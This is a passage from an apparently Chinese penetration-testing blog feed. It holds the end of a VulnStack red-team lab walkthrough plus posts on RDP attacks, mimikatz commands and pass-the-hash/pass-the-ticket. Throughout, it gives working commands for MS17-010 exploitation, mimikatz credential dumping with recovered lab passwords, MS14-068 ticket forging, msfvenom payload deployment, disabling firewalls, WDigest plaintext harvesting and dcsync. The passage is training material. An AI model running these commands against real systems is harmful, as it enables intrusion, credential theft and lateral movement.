src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230817093729290.png" alt="image-20230817093729290"></p><p>在proxychains的配置文件也端口也改为 7777</p><p>然后对这两台机器进行端口扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains nmap <span class="token number">192.168</span>.183.129 <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sV</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230815151214592.png" alt="image-20230815151214592"></p><p>是台win7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains nmap <span class="token number">192.168</span>.183.130 <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sV</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230815151837470.png" alt="image-20230815151837470"></p><p>发现两台机器都开放445端口，利用msf自带模块检测是否含有ms17_010</p><h3 id="拿下内网主机"><a href="#拿下内网主机" class="headerlink" title="拿下内网主机"></a>拿下内网主机</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsolesetg proxies socks5:127.0.0.1:7777search ms17_010use <span class="token number">3</span><span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.183.129run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230815155338452.png" alt="image-20230815155338452"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.183.130run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230815162215418.png" alt="image-20230815162215418"></p><p>然后用ms17_010打</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsolesetg proxies socks5:127.0.0.1:7777search ms17_010use <span class="token number">0</span><span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.183.129<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcprun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816175948766.png" alt="image-20230816175948766"></p><p>成功拿到meterpreter，129这台win算是拿下（但是攻击2次才成功）</p><p>但是用ms17_010打  130的机子没有打成功应该是开了防火墙</p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>首先进入shell，收集一些信息</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816180832494.png" alt="image-20230816180832494"></p><p>用chcp 65001解除乱码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net view<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816190843263.png" alt="image-20230816190843263"></p><p>发现有两台机子,win7我们已经拿下</p><p>可以ping一下另一台机子</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> WIN-ENS2VR5TR3N<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816191048839.png" alt="image-20230816191048839"></p><p>发现该机子就是130那台机子</p><h4 id="攻击130"><a href="#攻击130" class="headerlink" title="攻击130"></a>攻击130</h4><p>然后查看电脑上都有什么文件</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816191555517.png" alt="image-20230816191555517"></p><p>发现一堆好东西</p><p>先用mimikatz抓取密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mimikatz.exesekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816192041713.png" alt="image-20230816192041713"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">username:douserpassword:Dotest123domain:DEMO.COMSID: S-1-5-21-979886063-1111900045-1414766810-1107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后利用已有的ms14_068,拿到生成TGT票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ms14-068.exe <span class="token parameter variable">-u</span> douser@DEMO.com <span class="token parameter variable">-s</span> S-1-5-21-979886063-1111900045-1414766810-1107 <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.183.130 <span class="token parameter variable">-p</span> Dotest123// ms14-068.exe <span class="token parameter variable">-u</span> 域成员名@域名.com <span class="token parameter variable">-s</span> 域成员sid <span class="token parameter variable">-d</span> 域控制器ip地址 <span class="token parameter variable">-p</span> 域成员密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816193305293.png" alt="image-20230816193305293"></p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge   #清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造kerberos::list    #查看当前机器凭证kerberos::ptc TGT_douser@demo.com.ccache  #&lt;上图中生成的票据文件&gt;将票据注入到内存中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816195319244.png" alt="image-20230816195319244"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token punctuation">\</span>c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816195449091.png" alt="image-20230816195449091"></p><p>可以看到已经访问到WIN-ENS2VR5TR3N文件了，然后可以把木马传到WIN-ENS2VR5TR3N机子上</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/bind_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.111.128 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">6666</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> hack.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先把hack.exe上传到win7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">upload /home/kali/Desktop/msf/hack.exe C:<span class="token punctuation">\</span><span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token punctuation">\</span>douser<span class="token punctuation">\</span><span class="token punctuation">\</span>Desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816210001885.png" alt="image-20230816210001885"></p><p>然后再把hack.exe上传到WIN-ENS2VR5TR3N</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">copy hack.exe <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token punctuation">\</span>c$<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token punctuation">\</span>c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230816210333729.png"></p><p>发现已经上传成功</p><p>先关闭130机子的防火墙</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create unablefirewall <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"netsh advfirewall set allprofiles state off"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start unablefirewall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230817113420072.png" alt="image-20230817113420072"></p><p>在kali上设置监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">setg proxies socks5:127.0.0.1:7777use exploit/multi/handler<span class="token builtin class-name">set</span> lport <span class="token number">6666</span><span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.183.130run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用sc创建服务来执行木马文件</p><pre class="line-numbers language-none"><code class="language-none">sc \\WIN-ENS2VR5TR3N create bindshell binpath&#x3D; &quot;c:\hack.exe&quot;sc \\WIN-ENS2VR5TR3N start bindshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿到meterpreter</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230817113636323.png" alt="image-20230817113636323"></p><p>但是由于开始代理meterpreter很容易断，争分夺秒的读取密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">load kiwikiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230817114646851.png" alt="image-20230817114646851"></p><pre class="line-numbers language-none"><code class="language-none">username:administratordomain:DEMOpassword:asdASD123!@#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后通过nmap扫描发现3389端口没开</p><p>通过注册表的方式打开</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230817140954194.png" alt="image-20230817140954194"></p><p>发现3389已经打开</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230817141028356.png" alt="image-20230817141028356"></p><p>然后尝试远程连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rdesktop <span class="token number">192.168</span>.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">DEMO\administratorasdASD123!@#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230817141314560.png" alt="image-20230817141314560"></p><p>连接成功，成功打穿</p><p>参考文章：</p><p><a href="https://blog.csdn.net/zy15667076526/article/details/116059592?spm=1001.2014.3001.5502">https://blog.csdn.net/zy15667076526/article/details/116059592?spm=1001.2014.3001.5502</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK红队实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK红队实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RDP之渗透</title>
      <link href="/2023/08/12/RDP%E4%B9%8B%E6%B8%97%E9%80%8F/"/>
      <url>/2023/08/12/RDP%E4%B9%8B%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h2><p>RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议T.120 的一个扩展。远程桌面协议让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。大部分的 Windows、Linux、FreeBSD、Mac OS X 都有相应的客户端。远程桌面协议在服务端默认监听 TCP 3389 端口的数据。远程桌面协议为用户提供了通过网络连接远程登录到另一台计算机的图形界面。</p><h2 id="查看RDP是否开启"><a href="#查看RDP是否开启" class="headerlink" title="查看RDP是否开启"></a>查看RDP是否开启</h2><h3 id="查看是否开启"><a href="#查看是否开启" class="headerlink" title="查看是否开启"></a>查看是否开启</h3><p>查看注册表</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">REG QUERY <span class="token string">"HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server"</span> /v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看RDP服务的端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">REG QUERY <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ WinStations\RDP-Tcp"</span> /v PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看进程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tasklist /svc <span class="token operator">|</span> <span class="token function">find</span> <span class="token string">"TermService"</span>    <span class="token comment"># 找到对应服务进程的 PID </span><span class="token function">netstat</span> <span class="token parameter variable">-ano</span> <span class="token operator">|</span> <span class="token function">find</span> <span class="token string">"3389"</span>    <span class="token comment"># 找到进程对应的端口号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="强制开启RDP"><a href="#强制开启RDP" class="headerlink" title="强制开启RDP"></a>强制开启RDP</h3><p>修改注册表允许远程桌面连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">REG ADD HKLMSYSTEMCurrentControlSetControlTerminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果目标开启了防火墙，还需要配置防火墙为允许远程桌面连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"Remote Desktop"</span> <span class="token assign-left variable">protocol</span><span class="token operator">=</span>TCP <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">localport</span><span class="token operator">=</span><span class="token number">3389</span> <span class="token assign-left variable">action</span><span class="token operator">=</span>allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接关闭防火墙</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="通过-Metasploit-模块启动RDP"><a href="#通过-Metasploit-模块启动RDP" class="headerlink" title="通过 Metasploit 模块启动RDP"></a>通过 Metasploit 模块启动RDP</h3><p>使用<code>metasploit</code>启动 首先要获取目标一个<code>session</code>，然后使用后渗透模块post&#x2F;windows&#x2F;manage&#x2F;enable_rdp 开启远程连接。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use post/windows/manage/enable_rdp<span class="token builtin class-name">set</span> session <span class="token number">1</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="远程桌面的连接"><a href="#远程桌面的连接" class="headerlink" title="远程桌面的连接"></a>远程桌面的连接</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre class="line-numbers language-none"><code class="language-none">redesktop IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">搜索 mstsc但是有时候还是会报错关闭鉴权模式就可以正常连接了REG ADD <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v UserAuthentication /t REG_DWORD /d <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PTH-登录远程-RDP"><a href="#PTH-登录远程-RDP" class="headerlink" title="PTH 登录远程 RDP"></a>PTH 登录远程 RDP</h2><p>先检查是否开启RDP服务，如果没开启就给他开启</p><p>然后在目标机器上mimikatz执行命令获取NTLM的哈希值</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在我们的Windows攻击机上</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:127.0.0.1 &#x2F;ntlm:781fd284a63ba30ef7a09a68a3a96fe8 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="RDP相关的漏洞"><a href="#RDP相关的漏洞" class="headerlink" title="RDP相关的漏洞"></a>RDP相关的漏洞</h2><h3 id="MS12-020"><a href="#MS12-020" class="headerlink" title="MS12-020"></a>MS12-020</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.93.20<span class="token builtin class-name">set</span> rport <span class="token number">3389</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h3><p>在msf里面利用 exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</p><p>参考文章：</p><p>里面还有更多详细的用法</p><p><a href="https://cn-sec.com/archives/542935.html">https://cn-sec.com/archives/542935.html</a></p><p><a href="https://blog.csdn.net/qq_64973687/article/details/128230410">https://blog.csdn.net/qq_64973687/article/details/128230410</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RDP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mimikatz</title>
      <link href="/2023/08/11/mimikatz/"/>
      <url>/2023/08/11/mimikatz/</url>
      
        <content type="html"><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz是法国人Gentil Kiwi编写的一款windows平台下的神器，它具备很多功能，其中最亮的功能是直接从 lsass.exe 进程里获取windows处于active状态账号的明文密码 </p><p>mimikatz的功能不仅如此，它还可以提升进程权限，注入进程，读取进程内存等等，mimikatz包含了很多本地模块，更像是一个轻量级的调试器。</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">system::user               //查看当前登录的用户process::list              //列出进程process::stop processname  //结束进程（有些进程结束不了，即使权限够大）process::suspend  processname //暂停进程process::modules              //列出系统核心模块和其所在的物理路径service::list                 //列出系统服务service::stop<span class="token punctuation">(</span>start<span class="token punctuation">)</span> service_name   //停止（开启）服务privilege::list               //列出系统权限列表privilege::debug              //提升权限 （执行这条命令得有足够的权限）nogpo::cmd                    //打开cmdnogpo::regedit                //打开注册表ts::sessions                  //显示当前回话ts::processes                 //显示当前进程及其PIDsekurlsa::logonpasswords      //获取当前在线用户的明文密码（需要高权限运行）lsadump::lsa /patch           //获取当前此计算机存在过用户的NTLMHASHinject::process lsass.exe <span class="token string">'路径'</span> sekurlsa.dll //进程注入（如果用1.0版本获取hash的时候发现sekurlsa模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cls：       清屏standard：  标准模块，基本命令crypto：    加密相关模块sekurlsa：  与证书相关的模块kerberos：  kerberos模块privilege： 提权相关模块process：   进程相关模块serivce：   服务相关模块lsadump：   LsaDump模块ts：        终端服务器模块event：     事件模块misc：      杂项模块token：     令牌操作模块vault：     Windows 、证书模块minesweeper：Mine Sweeper模块net：dpapi：     DPAPI模块（通过API或RAW访问）<span class="token punctuation">[</span>数据保护应用程序编程接口<span class="token punctuation">]</span>busylight： BusyLight Modulesysenv：    系统环境值模块sid：       安全标识符模块iis：       IIS XML配置模块rpc：       mimikatz的RPC控制sr98：      用于SR98设备和T5577目标的RF模块rdm：       RDM（830AL）器件的射频模块acr：       ACR模块version：   查看版本exit：      退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="sekurlsa模块"><a href="#sekurlsa模块" class="headerlink" title="sekurlsa模块"></a>sekurlsa模块</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sekurlsa::logonpasswords抓取用户NTLM哈希sekurlsa::msv加载dmp文件，并导出其中的明文密码sekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full导出lsass.exe进程中所有的票据sekurlsa::tickets /export<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="kerberos模块"><a href="#kerberos模块" class="headerlink" title="kerberos模块"></a>kerberos模块</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">列出系统中的票据kerberos::listkerberos::tgt清除系统中的票据kerberos::purge导入票据到系统中kerberos::ptc 票据路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lsadump模块"><a href="#lsadump模块" class="headerlink" title="lsadump模块"></a>lsadump模块</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在域控上执行<span class="token punctuation">)</span>查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等lsadump::dcsync /domain:kevin.com /user:root<span class="token punctuation">(</span>在域控上执行<span class="token punctuation">)</span>读取所有域用户的哈希lsadump::lsa /patch从sam.hive和system.hive文件中获得NTLM Hashlsadump::sam /sam:sam.hive /system:system.hive从本地SAM文件中读取密码哈希token::elevatelsadump::sam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="读取域成员HASH"><a href="#读取域成员HASH" class="headerlink" title="读取域成员HASH"></a>读取域成员HASH</h2><h3 id="域控本地读取"><a href="#域控本地读取" class="headerlink" title="域控本地读取"></a>域控本地读取</h3><ul><li>直接执行</li></ul><pre class="line-numbers language-none"><code class="language-none">Copy#提升权限privilege::debug抓取密码lsadump::lsa &#x2F;patch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取</li></ul><pre class="line-numbers language-none"><code class="language-none">Copy#获取所有域用户lsadump::dcsync &#x2F;domain:test.com &#x2F;all &#x2F;csv#指定获取某个用户的hashlsadump::dcsync &#x2F;domain:test.com &#x2F;user:test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：</p><p><a href="https://blog.gentilkiwi.com/mimikatz">https://blog.gentilkiwi.com/mimikatz</a></p><p><a href="https://blog.51cto.com/u_15127617/4276127">https://blog.51cto.com/u_15127617/4276127</a></p><p><a href="https://blog.csdn.net/weixin_40412037/article/details/113348310">https://blog.csdn.net/weixin_40412037/article/details/113348310</a></p><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119497964">https://blog.csdn.net/weixin_45588247/article/details/119497964</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mimikatz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTH&amp;PTT</title>
      <link href="/2023/08/10/PTH-PTT/"/>
      <url>/2023/08/10/PTH-PTT/</url>
      
        <content type="html"><![CDATA[<h2 id="HASH"><a href="#HASH" class="headerlink" title="HASH"></a>HASH</h2><p>在 Windows 中是不会保存明文密码的，只会保存密码的哈希值。 其中本机用户的密码哈希是放在 本地的 SAM 文件 里面，域内用户的密码哈希是存在域控的 NTDS.dit 文件 里面。在渗透测试中，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件中导出所有用户的Hash。</p><p>LM Hash（LAN Manager Hash）是 Windows 最早使用的加密算法，由 IBM 设计，其本质是 DES 加密，由于使用的 DES 算法，因此它的 KEY 是固定的，同时结合一些其他特性导致 LM Hash 加密算法较为脆弱，因此微软在 1993 年在 NT 3.1 中引入了 NTLM 协议。</p><p>NTLM Hash 是基于 MD4 的加密算法，个人版从 Vista 以后，服务版从 Windows Server 2003 以后，系统的认证方式都采用了 NTLM Hash，为了兼容性，微软也只是把 LM Hash 禁用了，只启用了 NTLM Hash.</p><p>在 Windows Vista 和 Windows Server 2003 及之前的系统默认使用的是 LM 加密，只有用户密码超过 14 位时才会使用 NTLM 加密，之后从 Vista 的系统开始，不再使用 LM Hash 加密，而是全部采用了 NTLM Hash 加密</p><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>哈希传递（pass the hash）,利用哈希去在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证。NTLM Hash陆内网中的其它机器，而不是通过明文登陆的方式。通过哈希攻击攻击者就不需要花费太多时间破解哈希值。<br>在目标主机上使用 mimikatz 获取 NTLM Hash</p><p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reg <span class="token function">add</span> HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>SecurityProviders<span class="token punctuation">\</span>WDigest /v UseLogonCredential /t REG_DWORD /d <span class="token number">1</span> /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在远程主机上以管理员权限打开 mimikatz</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">privilege::debugsekurlsa::pth /user:administrator /domain:domain /ntlm:161cff084477fe596a5db81874498a24sekurlsa::pth /user:用户名  /domain:域名  /ntlm:密码哈希<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>成功，此时会自动弹出一个新的cmd窗口，这时访问远程主机或服务，就不用提供明文密码了</p><h2 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>票据传递（pass the ticket）,PTT)是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PTH基于NTLM认证进行攻击，而<code>PTT</code>基于<code>kerberos</code>协议进行攻击票据传递攻击，目的是伪造、窃取凭据提升权限</p><h3 id="Kerberos-协议"><a href="#Kerberos-协议" class="headerlink" title="Kerberos 协议"></a>Kerberos 协议</h3><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5?fromModule=lemma_inlink">密钥</a>系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F?fromModule=lemma_inlink">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA%E5%9C%B0%E5%9D%80?fromModule=lemma_inlink">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a 